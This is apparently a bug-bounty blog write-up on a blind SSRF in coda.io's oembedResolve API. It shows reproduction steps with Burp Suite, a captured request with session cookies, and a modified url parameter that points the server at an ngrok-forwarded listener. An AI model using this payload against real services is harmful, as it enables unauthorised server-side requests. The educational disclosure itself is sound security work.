---
title: Blind SSRF on https://coda.io [Bug Hunting]
updated: 2020-05-02 12:37
---

## Summary:
The following article is about a limited Blind SSRF found on coda.io, however this specifically bug is Out Of Scope, but I am publishing this article for educational purposes only and understanding that not every SSRF vulnerable endpoint is directly shown into URL.

## Steps To Reproduce (Detailed):
1. Create an account and click “New Doc”
2. Open Burp Suite
3. Add a random link (http://google.com) in the Blank document. I pasted http://google.com

![coda.io_pasted_link](https://miro.medium.com/max/700/1*ge1CBnzCC0LCwSsYpn3KXQ.png)

4. Right after you paste the link, the request will be captured by Burp Suite (which when I first saw it, made me feel weird):

![bupr_suite_api_request](https://miro.medium.com/max/700/1*XFzxQC_3YZxgv1SO1cscTA.png)

Here is the request in text:

```
GET /api/oembedResolve?docId=9eyvV-2wPb&url=http%3a//google.com&isMobile=false&type=embed HTTP/1.1
Host: coda.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://coda.io/d/script-alert-1-script_d9eyvV-2wPb/Blind-SSRF-PoC_su744
Connection: close
Cookie: session_data=eyJpZCI6ImFzLWRwM2tlRTZta2cifQ; _gid=GA1.2.605406728.1588442552; _fbp=fb.1.1588350085313.1242192472; user_consent=eyJhbmFseXRpY3NBbGxvd2VkIjp0cnVlLCJhZHZlcnRpc2luZ0FsbG93ZWQiOnRydWV9; csrf_token=rS6BVpPBGO378IP3; auth_flag=NDYyNjU1; cookie_info_consent=dismiss; auth_session=xesHxSUtKDxX6RWZnuZ2WA.sKVzy_Bmtnq35Ynczc-mKITF6KIc8gB0rHbeDCyPpYEUSlgGlVn9TJGHybP_SVsProAmstZAd7wjxkookEO0xwKCO4-sOTaxIy8aE12W5npFwxGRZF0JpZX1MaP2yCa6.1588350834554.315360000000.Han3nwsHud5LBY8sE4mkxl7Ppb1HPwwna1k8U8Mybn0; _ga=GA1.2.807689529.1588442552; intercom-session-m22vs7y5=TGVJMDBzLzBvbWhReGFQTHJUUERvNmJQYktsbWlzanp6TUJBZmREVFJuNUE5RE5QaDdnMGs2dEY5VGkvb3FtLy0tNU95NUtNV1NVT29LTFVBRFRsdUVtZz09--9a228357063a08feb8dd1f5759226c83fa89d6fe
If-None-Match: W/"1a2-FgfpzWJUBVgjJx2YOHvV9McMvWw" 
```

I didn’t expect the server to send a request just because I pasted a simple link. In the burp i realised that the URL parameter on the following API endpoint seems to be vulnerable.

>/api/oembedResolve?docId=9eyvV-2wPb&url=http%3A%2F%2Fgoogle.com&isMobile=false&type=embed

We can change http://google.com with our Local IP (I am using Ngrok TCP for port forwarding: **http://0.tcp.ngrok.io:12756** which forwards to 127.0.0.1:1064).

The final link that we will replace is:
>/api/oembedResolve?docId=9eyvV-2wPb&url=http://0.tcp.ngrok.io:12756&isMobile=false&type=embed

Add the final link into the burp (by replacing it with http://google.com), and when we send the request, we get a connection in port 1064:

![netcat_connection_back](https://miro.medium.com/max/700/1*wPSn6NEZreVYtXgpPLZL_g.png)

## Simplier method without Burp Suite

Simply paste the url (http://0.tcp.ngrok.io:12756) into the document
Then you will directly get a connection on Listener (this case I used Netcat).

This method doesn’t require Burp, but for the sake of understanding, I recommend to use that tool.

## Example impact

I opened up a Simple HTTP Server on port 1064.
I will put the link: http://0.tcp.ngrok.io/12756/test.png , which will download test.jpg from my Local Server into the Remote Server.

>/api/oembedResolve?docId=9eyvV-2wPb&url=http://0.tcp.ngrok.io:12756/test.jpg&isMobile=false&type=embed

On the listener we got the GET request from the server:

![http-server-connection](https://miro.medium.com/max/700/1*aZC6FCrbb912H69kCLpV-w.png)

## Why this SSRF is different from the normal ones?

Normally a SSRF is about changing the url= parameter into the URL you want, but on this case I couldn’t find the url without using Burp Suite. Everything was happening on background.

## Conclusion

I was really happy to finally find a Critical Bug, however while making the article I realised that the specifically API endpoint related to SSRF was Out Of Scope. I still decided to create this article with the purpose of learning, and realising how creative a SSRF can be.
